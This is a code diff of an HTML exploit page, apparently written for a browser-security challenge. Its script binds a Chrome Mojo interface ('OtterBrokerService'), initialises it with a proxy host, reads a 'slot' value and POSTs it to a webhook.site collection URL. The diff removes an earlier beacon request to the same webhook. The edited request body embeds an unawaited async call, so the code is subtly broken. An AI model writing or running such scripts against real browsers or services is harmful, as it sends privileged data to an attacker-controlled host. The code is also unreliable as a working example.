@@ -5,14 +5,11 @@
 <button onclick=updateSlot()>Update Slot!</button>
 
 <script>
-  fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b?wtf=dasdsa");
   const ptr = new blink.mojom.OtterBrokerServicePtr();
   Mojo.bindInterface(blink.mojom.OtterBrokerService.name, mojo.makeRequest(ptr).handle);
   ptr.init("proxy.ottersec.workers.dev");
-  const { slot } =  (async () => await ptr.getSlot())();
-  txt.innerText = slot;
   fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b", {
     method: 'POST', // Specify the HTTP method
-    body: `${slot || 'lol'}`
+    body: `${(async () => await ptr.getSlot())() || 'wtf'}`
   });
 </script>
